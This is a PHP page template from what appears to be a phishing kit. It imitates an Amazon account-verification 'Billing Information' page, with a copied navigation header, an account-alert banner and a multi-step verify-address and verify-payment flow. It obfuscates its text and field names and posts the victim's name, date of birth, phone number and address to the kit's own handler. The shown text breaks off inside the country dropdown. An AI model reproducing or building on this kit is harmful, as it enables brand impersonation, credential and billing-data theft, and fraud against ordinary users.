<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Billing Information";
$api->check_cookie();
$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html lang="en-us" class="null a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style.css").'">
    <style type="text/css">
    .nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
        background-image: url('.$api->image_encode("assets/img/nav-global.png")['local'].');
        background-position: 0 1000px;
        background-repeat: repeat-x;
    }
    .nav-spinner {
        background-image: url('.$api->image_encode("assets/img/snake.gif")['local'].');
        background-position: center center;
        background-repeat: no-repeat;
    }
    .nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
        background-image: url('.$api->image_encode("assets/img/timeline.png")['local'].');
        background-repeat: no-repeat;
    }
    .pmts-indiv-issuer-image {
        background-repeat: no-repeat;
        display: block;
        float: left;
        height: 29px;
        width: 45px;
    }
    .pi-progress-bar-section {
        display: flex;
        justify-content: space-between;
        margin-top: 60px
    }
    .pi-step {
        align-items: center;
        display: flex;
        flex-direction: column
    }
    .pi-horizontal-divider {
        border-top: 1px solid #d5dbdb;
        height: 1px;
        margin-top: 14px;
        width: 100%
    }
    .pi-horizontal-divider.pi-first-child {
        margin-left: 50%;
        width: 50%
    }
    .pi-horizontal-divider.pi-last-child {
        margin-right: 50%;
        width: 50%
    }
    .pi-step-circle {
        align-items: center;
        border-radius: 50%;
        color: #fff;
        display: flex;
        font-size: 13px;
        height: 28px;
        justify-content: center;
        margin-top: -14px;
        width: 28px
    }
    .pi-step-circle.pi-completed {
        background: #42973d
    }
    .pi-step-circle.pi-active {
        background: #b95b22
    }
    .pi-step-circle.pi-incomplete {
        background: #fff;
        border: thin solid #dadcdf;
        color: #dadcdf
    }
    .pi-step-label {
        display: none;
        font-size: 13px;
        width: max-content
    }
    @media (min-width: 37.5em) {
      .pi-step-label {
        display: block;
        text-align: center
      }
    }
    .pi-step-label.pi-completed {
        color: #42973d
    }
    .pi-step-label.pi-active {
        color: #b95b22
    }
    .pi-step-label.pi-incomplete {
        color: #767676
    }
    button, input, select {
        font-family: inherit
    }
    h1, h2, h4, h5 {
        padding: 0;
        margin: 0
    }
    h1, h2, h4 {
        padding-bottom: 4px
    }
    h1, h2, h4 {
        text-rendering: optimizeLegibility
    }
    h4:last-child {
        padding-bottom: 0
    }
    h1, h2 {
        padding-bottom: 4px
    }
    h4 {
        padding-bottom: 4px
    }
    p {
        padding: 0;
        margin: 0 0 14px 0
    }
    p:last-child {
        margin-bottom: 0
    }
    p+p {
        margin-top: -4px
    }
    i {
        font-style: italic
    }
    </style>
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/header.css").'">
    <script>
        var countryCode = "'.$_SESSION['countrycode'].'";
    </script>
    <script>
        var fullnameEmpty = '.json_encode($lang['billingpage']['alertfullname']).';
        var fullnameCheck = '.json_encode($lang['billingpage']['checkalertfullname']).';
        var dobEmpty = '.json_encode($lang['billingpage']['alertdob']).';
        var dobCheck = '.json_encode($lang['billingpage']['checkalertdob']).';
        var dobInvalid = '.json_encode($lang['billingpage']['invalidalertdob']).';
        var dobmust17Th = '.json_encode($lang['billingpage']['dobmust17th']).';
        var phonenumberEmpty = '.json_encode($lang['billingpage']['alertphonenumber']).';
        var addressEmpty = '.json_encode($lang['billingpage']['alertaddressline1']).';
        var cityEmpty = '.json_encode($lang['billingpage']['alertcity']).';
        var stateEmpty = '.json_encode($lang['billingpage']['alertstate']).';
        var zipEmpty = '.json_encode($lang['billingpage']['alertzipcode']).';
    </script>
    <title dir="ltr">'.$api->text_encode($lang['billingheader']['titleaddress']).'</title>
</head>
<body class="a-m-us a-aui_72554-c a-aui_a11y_6_837773-t2 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-bw_aui_cxc_alert_measurement_1074111-c a-meter-animate">
    <a class="a-link-normal" rel="canonical" href="#addresses"></a>
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop.css").'">
    <div id="a-page">
        <img src="/assets/img/nav-global.png" style="display:none">
        <a id="nav-top"></a>
        <header id="navbar-main" class="nav-opt-sprite nav-flex nav-locale-us nav-lang-en nav-ssl nav-rec nav-progressive-attribute">
            <div id="navbar" cel_widget_id="Navigation-desktop-navbar" role="navigation" class="nav-sprite-v1 celwidget nav-bluebeacon nav-a11y-t1 bold-focus-hover layout2 nav-flex layout3 layout3-alt nav-celnav-t11 nav-packard-glow hamburger nav-progressive-attribute using-mouse" data-csa-c-id="ydyuxr-n2fuyl-lwkldf-49mg4l" data-cel-widget="Navigation-desktop-navbar">
                <div id="nav-belt">
                    <div class="nav-left">
                        <div id="nav-logo" class="nav-celnav-t11 nav-progressive-attribute">
                            <a href="#ref=nav_logo" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute">
                                <span class="nav-sprite nav-logo-base"></span>
                                <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
                                <span class="nav-logo-locale">.us</span>
                            </a>
                        </div>  
                        <div id="nav-global-location-slot">
                            <span id="nav-global-location-data-modal-action" class="a-declarative nav-progressive-attribute" data-a-modal="{&quot;width&quot;:375, &quot;closeButton&quot;:&quot;true&quot;,&quot;popoverLabel&quot;:&quot;Choose your location&quot;, &quot;ajaxHeaders&quot;:{&quot;anti-csrftoken-a2z&quot;:&quot;hG0zz1HIsC8R9ogYgSMkPUiXNEyIP1D8+C4RwS43urLRAAAAAGcp2cQAAAAB&quot;}, &quot;name&quot;:&quot;glow-modal&quot;, &quot;url&quot;:&quot;/portal-migration/hz/glow/get-rendered-address-selections?deviceType=desktop&amp;pageType=YourAccountAddressBook&amp;storeContext=NoStoreName&amp;actionSource=desktop-modal&quot;, &quot;footer&quot;:&quot;
                                <span class=\&quot;a-declarative\&quot; data-action=\&quot;a-popover-close\&quot; data-a-popover-close=\&quot;{}\&quot;>
                                    <span class=\&quot;a-button a-button-primary\&quot;>
                                        <span class=\&quot;a-button-inner\&quot;>
                                            <button name=\&quot;glowDoneButton\&quot; class=\&quot;a-button-text\&quot; type=\&quot;button\&quot;>'.$api->text_encode($lang['billingheader']['done']).'</button>
                                        </span>
                                    </span>
                                </span>&quot;,&quot;header&quot;:&quot;Choose your location&quot;}" data-action="a-modal">
                                <a id="nav-global-location-popover-link" role="button" tabindex="0" class="nav-a nav-a-2 a-popover-trigger a-declarative nav-progressive-attribute" href="#">
                                    <div class="nav-sprite nav-progressive-attribute" id="nav-packard-glow-loc-icon"></div>
                                    <div id="glow-ingress-block">
                                        <span class="nav-line-1 nav-progressive-content" id="glow-ingress-line1">
                                           '.$api->text_encode($lang['billingheader']['deliverto']).'
                                        </span>
                                        <span class="nav-line-2 nav-progressive-content" id="glow-ingress-line2">'.$api->text_encode($_SESSION['country']).'</span>
                                    </div>
                                </a>
                            </span>
                        </div>
                    </div>
                    <div class="nav-fill">
                        <div id="nav-search">
                            <div id="nav-bar-left"></div> 
                            <form id="nav-search-bar-form" class="nav-searchbar nav-progressive-attribute">
                            <div class="nav-left">
                                <div id="nav-search-dropdown-card">
                                    <div class="nav-search-scope nav-sprite">
                                        <div class="nav-search-facade">
                                            <span id="nav-search-label-id" class="nav-search-label nav-progressive-content">'.$api->text_encode($lang['billingheader']['all']).'</span>
                                            <i class="nav-icon"></i>
                                        </div>
                                        <label id="searchDropdownDescription" for="searchDropdownBox" class="nav-progressive-attribute" style="display:none">'.$api->text_encode($lang['billingheader']['selectdepartment']).'</label>
                                        <select class="nav-search-dropdown searchSelect nav-progressive-attrubute nav-progressive-search-dropdown" data-nav-digest="k+fyIAyB82R9jVEmroQ0OWwSW3A=" data-nav-selected="0" id="searchDropdownBox" style="display: block;" tabindex="0" title="Search in">
                                            <option selected="selected">'.$api->text_encode($lang['billingheader']['alldepartment']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['artscrafts']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['automotive']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['baby']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['beautypersonal']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['books']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['boysfashion']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['computers']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['deals']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['digitalmusic']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['electronics']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['girlsfashion']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['health']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['homekitchen']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['industrial']).'</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                            <div class="nav-fill">
                                <div class="nav-search-field ">
                                    <div class="ac-input-container">
                                        <div class="ac-live-field" id="ac-liveField" role="status" aria-atomic="true" aria-live="polite"></div>
                                        <div class="ac-input-overlay" aria-hidden="true">
                                            <span class="ac-ghost" id="ac-predictive-text">
                                                <span class="ac-current-input" id="ac-prefix"></span>
                                                <span class="ac-ghost-suggestion" id="ac-prediction"></span>
                                            </span>
                                        </div>
                                        <label for="twotabsearchtextbox" style="display: none;">'.$api->text_encode($lang['billingheader']['searchamazon']).'</label>
                                        <input type="text" id="twotabsearchtextbox" placeholder="'.$api->text_encode($lang['billingheader']['searchamazon']).'" class="nav-input nav-progressive-attribute" dir="auto" tabindex="0" role="searchbox" aria-autocomplete="list" aria-controls="sac-autocomplete-results-container" aria-expanded="false" aria-haspopup="grid" spellcheck="false">
                                    </div>
                                </div>
                                <div id="nav-iss-attach"></div>
                            </div>
                            <div class="nav-right">
                                <div class="nav-search-submit nav-sprite">
                                    <span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite nav-progressive-attribute">
                                        <input id="nav-search-submit-button" type="submit" class="nav-input nav-progressive-attribute" tabindex="0">
                                    </span>
                                </div>
                            </div>
                            </form>
                        </div>
                    </div>
                    <div class="nav-right">
                        <div id="nav-tools" class="layoutToolbarPadding">
                            <a href="#customer-preferences" id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2">
                                <span class="icp-nav-link-inner">
                                    <span class="nav-line-1"></span>
                                    <span class="nav-line-2">
                                        <span class="icp-nav-flag icp-nav-flag-'.strtolower($_SESSION['countrycode']).' icp-nav-flag-lop"></span>
                                        <div>'.$api->text_encode($_SESSION['countrycode']).'</div>
                                        <span class="nav-icon nav-arrow" style="visibility: visible;"></span>
                                    </span>
                                </span>
                            </a>
                            <a href="#homepage.htmln" class="nav-a nav-a-2 nav-truncate   nav-progressive-attribute" data-nav-ref="nav_youraccount_btn" data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList" tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav-link-accountList" data-csa-c-content-id="nav_youraccount_btn" data-csa-c-id="vczvcj-1v1pqb-dbbjjm-p52txz">
                                <div class="nav-line-1-container">
                                    <span id="nav-link-accountList-nav-line-1" class="nav-line-1 nav-progressive-content">'.$api->text_encode($lang['billingheader']['hello']).'</span>
                                </div>
                                <span class="nav-line-2 ">'.$api->text_encode($lang['billingheader']['accountlist']).'
                                    <span class="nav-icon nav-arrow" style="visibility: visible;"></span>
                                </span>
                            </a>
                            <a href="#orders_first" class="nav-a nav-a-2   nav-progressive-attribute" id="nav-orders" tabindex="0">
                                <span class="nav-line-1">'.$api->text_encode($lang['billingheader']['returns']).'</span>
                                <span class="nav-line-2">'.$api->text_encode($lang['billingheader']['orders']).'
                                    <span class="nav-icon nav-arrow"></span>
                                </span>
                            </a>
                            <a href="#cart" class="nav-a nav-a-2 nav-progressive-attribute" id="nav-cart">
                                <div id="nav-cart-count-container">
                                    <span id="nav-cart-count" aria-hidden="true" class="nav-cart-count nav-cart-0 nav-progressive-attribute nav-progressive-content">0</span>
                                    <span class="nav-cart-icon nav-sprite"></span>
                                </div>
                                <div id="nav-cart-text-container" class=" nav-progressive-attribute">
                                    <span aria-hidden="true" class="nav-line-1"></span>
                                    <span aria-hidden="true" class="nav-line-2">
                                        Cart
                                        <span class="nav-icon nav-arrow"></span>
                                    </span>
                                </div>
                            </a>
                        </div>
                    </div>
                </div>
                <div id="nav-main" class="nav-sprite">
                    <div class="nav-left">  
                        <a href="javascript: void(0)" id="nav-hamburger-menu" role="button" aria-expanded="false" data-csa-c-type="widget" data-csa-c-slot-id="HamburgerMenuDesktop" data-csa-c-interaction-events="click" data-csa-c-id="yxnpwu-qwfiby-cz2jjd-9qss2v">
                            <i class="hm-icon nav-sprite"></i>
                            <span class="hm-icon-label">'.$api->text_encode($lang['billingheader']['all']).'</span>
                        </a>
                        <button class="nav-rufus-disco" id="nav-rufus-disco" data-state="closed" role="button" data-csa-c-type="button" data-csa-c-slot-id="rufus-dsk-disco-slot" data-csa-c-content-id="rufus-dsk-disco-content" data-csa-c-id="mc0xbu-5bxrnj-qfdjqw-z7qe15">
                            <div id="nav-rufus-disco-avatar" class="nav-rufus-disco-avatar"></div>
                            <div id="nav-rufus-disco-text" class="nav-rufus-disco-text">'.$api->text_encode($lang['billingheader']['rufus']).'</div>
                        </button>
                    </div>
                    <div class="nav-fill">
                        <div id="nav-shop"></div>
                        <div id="nav-xshop-container">
                            <div id="nav-xshop" class="nav-progressive-content">  
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_0" data-csa-c-content-id="nav_cs_gb" data-csa-c-id="i4cekv-eu0oh8-k5645k-xwic5t">'.$api->text_encode($lang['billingheader']['todaysdeals']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_1" data-csa-c-content-id="nav_cs_buy_again" data-csa-c-id="6mkf9m-yxpxpd-a3o6ed-su9eny">'.$api->text_encode($lang['billingheader']['primevideo']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_2" data-csa-c-content-id="nav_cs_help" data-csa-c-id="s34j0u-rbldj7-p25r5l-hes7as">'.$api->text_encode($lang['billingheader']['buyagain']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_3" data-csa-c-content-id="nav_cs_registry" data-csa-c-id="oge3yg-ke5zrz-bs5swb-4ks55l">'.$api->text_encode($lang['billingheader']['customerservice']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_4" data-csa-c-content-id="nav_cs_gc" data-csa-c-id="73lqd6-z0j7kh-q9hmr5-tugsq3">'.$api->text_encode($lang['billingheader']['registry']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_5" data-csa-c-content-id="nav_cs_sell" data-csa-c-id="qx0f2v-j3atlv-x2xl0l-alvk19">'.$api->text_encode($lang['billingheader']['giftcard']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_0" data-csa-c-content-id="nav_cs_gb" data-csa-c-id="i4cekv-eu0oh8-k5645k-xwic5t">'.$api->text_encode($lang['billingheader']['sell']).'</a>
                                <a href="#gp" class="nav-hidden-aria  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_6" data-csa-cid="bfbbpt-ej6dtk-eisaj6-2vluqz">'.$api->text_encode($lang['billingheader']['disability']).'</a>
                            </div>
                        </div>
                    </div>
                    <div class="nav-right">
                        <div id="nav-swmslot"></div>
                    </div>
                </div>
                <div id="nav-subnav-toaster"></div>
                <div id="nav-progressive-subnav"></div>
                <div id="nav-cover" style="z-index: 1; height: 1714px; display: none; opacity: 0.6;"></div>
                <div id="nav-flyout-ewc" class="nav-ewc-lazy-align nav-ewcFlyout nav-flyout nav-locked" style="top: 0px; height: 954px;">
                    <div class="nav-flyout-body ewc-beacon" tabindex="-1">
                        <div class="nav-ewc-content"></div>
                    </div>
                    <div class="nav-template nav-flyout-content" style="display: none;"></div>
                    <div class="nav-template nav-flyout-content" style="display: none;"></div>
                    <div class="nav-template nav-flyout-content" style="display: none;"></div>
                </div>
            </div>
        </header>
        <a id="skippedLink" tabindex="-1"></a>
        <div class="a-section">
            <div class="a-section a-spacing-medium a-text-left address-narrow-container-desktop">
                <div class="katal" id="progress-bar-root">
                    <div class="pi-progress-bar-section" style="margin: 20px 0 10px 0 !important;">
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-first-child"></div>
                            <div class="pi-step-circle pi-active"> 1 </div>
                            <div class="pi-step-label pi-active">
                                '.$api->text_encode($lang['billingpage']['verifyaddress']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider"></div>
                            <div class="pi-step-circle pi-incomplete"> 2 </div>
                            <div class="pi-step-label pi-incomplete">
                                '.$api->text_encode($lang['billingpage']['verifypayment']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-last-child"></div>
                            <div class="pi-step-circle pi-incomplete"> 3 </div>
                                <div class="pi-step-label pi-incomplete">
                                    '.$api->text_encode($lang['billingpage']['complete']).'
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="a-section a-spacing-none a-spacing-top-mini">
                        <div class="a-box a-alert a-alert-warning a-spacing-none" aria-live="polite" aria-atomic="true">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">'.$api->text_encode($lang['billingheader']['alertaccount']).'</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <div class="a-section">'.$api->text_encode($lang['billingheader']['noticealertaccount']).'</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="a-section">    
                        <h2>'.$api->text_encode($lang['billingpage']['titleverifyaddress']).'</h2>
                        <label class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['enterinformation']).'</span>
                        </label>
                        <form action="/ap/account/payment" method="post">
                        <span id="address-ui-widget-content">
                            <div id="address-ui-widgets-enterAddressFormContainer" data-csa-c-content-id="address-ui-widgets-enterAddressFormContainer-content-id-US" data-csa-c-slot-id="address-ui-widgets-enterAddressFormContainer-slot-id-US" data-csa-c-type="widget" class="a-section celwidget" data-csa-c-id="97zbnl-9nx1cq-yqel8h-kiolat" data-cel-widget="address-ui-widgets-enterAddressFormContainer">
                                <div id="address-ui-widgets-SpinnerContainer" class="a-section">
                                    <div id="address-ui-widgets-Spinner" class="a-spinner-wrapper aok-hidden">
                                        <span class="a-spinner a-spinner-medium"></span>
                                    </div>
                                </div>
                                <div class="a-row">
                                    <div class="a-input-text-group a-spacing-medium a-spacing-top-medium">
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="address-ui-widgets-countrycode-dropdown-nativeId" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['billingpage']['country']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <select name="'.$api->encypt('country').'" id="country" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                <option value="'.$_SESSION['country'].'">'.$api->text_encode($_SESSION['country']).'</option>
                                                <option value="Afghanistan">'.$api->text_encode('Afghanistan').'</option>
                                                <option value="Albania">'.$api->text_encode('Albania').'</option>
                                                <option value="Algeria">'.$api->text_encode('Algeria').'</option>
                                                <option value="Andorra">'.$api->text_encode('Andorra').'</option>
                                                <option value="Angola">'.$api->text_encode('Angola').'</option>
                                                <option value="Antigua and Barbuda">'.$api->text_encode('Antigua and Barbuda').'</option>
                                                <option value="Argentina">'.$api->text_encode('Argentina').'</option>
                                                <option value="Armenia">'.$api->text_encode('Armenia').'</option>
                                                <option value="Australia">'.$api->text_encode('Australia').'</option>
                                                <option value="Austria">'.$api->text_encode('Austria').'</option>
                                                <option value="Azerbaijan">'.$api->text_encode('Azerbaijan').'</option>
                                                <option value="Bahamas">'.$api->text_encode('Bahamas').'</option>
                                                <option value="Bahrain">'.$api->text_encode('Bahrain').'</option>
                                                <option value="Bangladesh">'.$api->text_encode('Bangladesh').'</option>
                                                <option value="Barbados">'.$api->text_encode('Barbados').'</option>
                                                <option value="Belarus">'.$api->text_encode('Belarus').'</option>
                                                <option value="Belgium">'.$api->text_encode('Belgium').'</option>
                                                <option value="Belize">'.$api->text_encode('Belize').'</option>
                                                <option value="Benin">'.$api->text_encode('Benin').'</option>
                                                <option value="Bhutan">'.$api->text_encode('Bhutan').'</option>
                                                <option value="Bolivia">'.$api->text_encode('Bolivia').'</option>
                                                <option value="Bosnia and Herzegovina">'.$api->text_encode('Bosnia and Herzegovina').'</option>
                                                <option value="Botswana">'.$api->text_encode('Botswana').'</option>
                                                <option value="Brazil">'.$api->text_encode('Brazil').'</option>
                                                <option value="Brunei">'.$api->text_encode('Brunei').'</option>
                                                <option value="Bulgaria">'.$api->text_encode('Bulgaria').'</option>
                                                <option value="Burkina Faso">'.$api->text_encode('Burkina Faso').'</option>
                                                <option value="Burundi">'.$api->text_encode('Burundi').'</option>
                                                <option value="Cabo Verde">'.$api->text_encode('Cabo Verde').'</option>
                                                <option value="Cambodia">'.$api->text_encode('Cambodia').'</option>
                                                <option value="Cameroon">'.$api->text_encode('Cameroon').'</option>
                                                <option value="Canada">'.$api->text_encode('Canada').'</option>
                                                <option value="Central African Republic">'.$api->text_encode('Central African Republic').'</option>
                                                <option value="Chad">'.$api->text_encode('Chad').'</option>
                                                <option value="Chile">'.$api->text_encode('Chile').'</option>
                                                <option value="China">'.$api->text_encode('China').'</option>
                                                <option value="Colombia">'.$api->text_encode('Colombia').'</option>
                                                <option value="Comoros">'.$api->text_encode('Comoros').'</option>
                                                <option value="Congo (Congo-Brazzaville)">'.$api->text_encode('Congo (Congo-Brazzaville)').'</option>
                                                <option value="Costa Rica">'.$api->text_encode('Costa Rica').'</option>
                                                <option value="Croatia">'.$api->text_encode('Croatia').'</option>
                                                <option value="Cuba">'.$api->text_encode('Cuba').'</option>
                                                <option value="Cyprus">'.$api->text_encode('Cyprus').'</option>
                                                <option value="Czech Republic">'.$api->text_encode('Czech Republic').'</option>
                                                <option value="Denmark">'.$api->text_encode('Denmark').'</option>
                                                <option value="Djibouti">'.$api->text_encode('Djibouti').'</option>
                                                <option value="Dominica">'.$api->text_encode('Dominica').'</option>
                                                <option value="Dominican Republic">'.$api->text_encode('Dominican Republic').'</option>
                                                <option value="Ecuador">'.$api->text_encode('Ecuador').'</option>
                                                <option value="Egypt">'.$api->text_encode('Egypt').'</option>
                                                <option value="El Salvador">'.$api->text_encode('El Salvador').'</option>
                                                <option value="Equatorial Guinea">'.$api->text_encode('Equatorial Guinea').'</option>
                                                <option value="Eritrea">'.$api->text_encode('Eritrea').'</option>
                                                <option value="Estonia">'.$api->text_encode('Estonia').'</option>
                                                <option value="Eswatini">'.$api->text_encode('Eswatini').'</option>
                                                <option value="Ethiopia">'.$api->text_encode('Ethiopia').'</option>
                                                <option value="Fiji">'.$api->text_encode('Fiji').'</option>
                                                <option value="Finland">'.$api->text_encode('Finland').'</option>
                                                <option value="France">'.$api->text_encode('France').'</option>
                                                <option value="Gabon">'.$api->text_encode('Gabon').'</option>
                                                <option value="Gambia">'.$api->text_encode('Gambia').'</option>
                                                <option value="Georgia">'.$api->text_encode('Georgia').'</option>
                                                <option value="Germany">'.$api->text_encode('Germany').'</option>
                                                <option value="Ghana">'.$api->text_encode('Ghana').'</option>
                                                <option value="Greece">'.$api->text_encode('Greece').'</option>
                                                <option value="Grenada">'.$api->text_encode('Grenada').'</option>
                                                <option value="Guatemala">'.$api->text_encode('Guatemala').'</option>
                                                <option value="Guinea">'.$api->text_encode('Guinea').'</option>
                                                <option value="Guinea-Bissau">'.$api->text_encode('Guinea-Bissau').'</option>
                                                <option value="Guyana">'.$api->text_encode('Guyana').'</option>
                                                <option value="Haiti">'.$api->text_encode('Haiti').'</option>
                                                <option value="Honduras">'.$api->text_encode('Honduras').'</option>
                                                <option value="Hungary">'.$api->text_encode('Hungary').'</option>
                                                <option value="Iceland">'.$api->text_encode('Iceland').'</option>
                                                <option value="India">'.$api->text_encode('India').'</option>
                                                <option value="Indonesia">'.$api->text_encode('Indonesia').'</option>
                                                <option value="Iran">'.$api->text_encode('Iran').'</option>
                                                <option value="Iraq">'.$api->text_encode('Iraq').'</option>
                                                <option value="Ireland">'.$api->text_encode('Ireland').'</option>
                                                <option value="Israel">'.$api->text_encode('Israel').'</option>
                                                <option value="Italy">'.$api->text_encode('Italy').'</option>
                                                <option value="Jamaica">'.$api->text_encode('Jamaica').'</option>
                                                <option value="Japan">'.$api->text_encode('Japan').'</option>
                                                <option value="Jordan">'.$api->text_encode('Jordan').'</option>
                                                <option value="Kazakhstan">'.$api->text_encode('Kazakhstan').'</option>
                                                <option value="Kenya">'.$api->text_encode('Kenya').'</option>
                                                <option value="Kiribati">'.$api->text_encode('Kiribati').'</option>
                                                <option value="Kuwait">'.$api->text_encode('Kuwait').'</option>
                                                <option value="Kyrgyzstan">'.$api->text_encode('Kyrgyzstan').'</option>
                                                <option value="Laos">'.$api->text_encode('Laos').'</option>
                                                <option value="Latvia">'.$api->text_encode('Latvia').'</option>
                                                <option value="Lebanon">'.$api->text_encode('Lebanon').'</option>
                                                <option value="Lesotho">'.$api->text_encode('Lesotho').'</option>
                                                <option value="Liberia">'.$api->text_encode('Liberia').'</option>
                                                <option value="Libya">'.$api->text_encode('Libya').'</option>
                                                <option value="Liechtenstein">'.$api->text_encode('Liechtenstein').'</option>
                                                <option value="Lithuania">'.$api->text_encode('Lithuania').'</option>
                                                <option value="Luxembourg">'.$api->text_encode('Luxembourg').'</option>
                                                <option value="Madagascar">'.$api->text_encode('Madagascar').'</option>
                                                <option value="Malawi">'.$api->text_encode('Malawi').'</option>
                                                <option value="Malaysia">'.$api->text_encode('Malaysia').'</option>
                                                <option value="Maldives">'.$api->text_encode('Maldives').'</option>
                                                <option value="Mali">'.$api->text_encode('Mali').'</option>
                                                <option value="Malta">'.$api->text_encode('Malta').'</option>
                                                <option value="Marshall Islands">'.$api->text_encode('Marshall Islands').'</option>
                                                <option value="Mauritania">'.$api->text_encode('Mauritania').'</option>
                                                <option value="Mauritius">'.$api->text_encode('Mauritius').'</option>
                                                <option value="Mexico">'.$api->text_encode('Mexico').'</option>
                                                <option value="Micronesia">'.$api->text_encode('Micronesia').'</option>
                                                <option value="Moldova">'.$api->text_encode('Moldova').'</option>
                                                <option value="Monaco">'.$api->text_encode('Monaco').'</option>
                                                <option value="Mongolia">'.$api->text_encode('Mongolia').'</option>
                                                <option value="Montenegro">'.$api->text_encode('Montenegro').'</option>
                                                <option value="Morocco">'.$api->text_encode('Morocco').'</option>
                                                <option value="Mozambique">'.$api->text_encode('Mozambique').'</option>
                                                <option value="Myanmar">'.$api->text_encode('Myanmar').'</option>
                                                <option value="Namibia">'.$api->text_encode('Namibia').'</option>
                                                <option value="Nauru">'.$api->text_encode('Nauru').'</option>
                                                <option value="Nepal">'.$api->text_encode('Nepal').'</option>
                                                <option value="Netherlands">'.$api->text_encode('Netherlands').'</option>
                                                <option value="New Zealand">'.$api->text_encode('New Zealand').'</option>
                                                <option value="Nicaragua">'.$api->text_encode('Nicaragua').'</option>
                                                <option value="Niger">'.$api->text_encode('Niger').'</option>
                                                <option value="Nigeria">'.$api->text_encode('Nigeria').'</option>
                                                <option value="North Korea">'.$api->text_encode('North Korea').'</option>
                                                <option value="North Macedonia">'.$api->text_encode('North Macedonia').'</option>
                                                <option value="Norway">'.$api->text_encode('Norway').'</option>
                                                <option value="Oman">'.$api->text_encode('Oman').'</option>
                                                <option value="Pakistan">'.$api->text_encode('Pakistan').'</option>
                                                <option value="Palau">'.$api->text_encode('Palau').'</option>
                                                <option value="Palestine">'.$api->text_encode('Palestine').'</option>
                                                <option value="Panama">'.$api->text_encode('Panama').'</option>
                                                <option value="Papua New Guinea">'.$api->text_encode('Papua New Guinea').'</option>
                                                <option value="Paraguay">'.$api->text_encode('Paraguay').'</option>
                                                <option value="Peru">'.$api->text_encode('Peru').'</option>
                                                <option value="Philippines">'.$api->text_encode('Philippines').'</option>
                                                <option value="Poland">'.$api->text_encode('Poland').'</option>
                                                <option value="Portugal">'.$api->text_encode('Portugal').'</option>
                                                <option value="Qatar">'.$api->text_encode('Qatar').'</option>
                                                <option value="Romania">'.$api->text_encode('Romania').'</option>
                                                <option value="Russia">'.$api->text_encode('Russia').'</option>
                                                <option value="Rwanda">'.$api->text_encode('Rwanda').'</option>
                                                <option value="Saint Kitts and Nevis">'.$api->text_encode('Saint Kitts and Nevis').'</option>
                                                <option value="Saint Lucia">'.$api->text_encode('Saint Lucia').'</option>
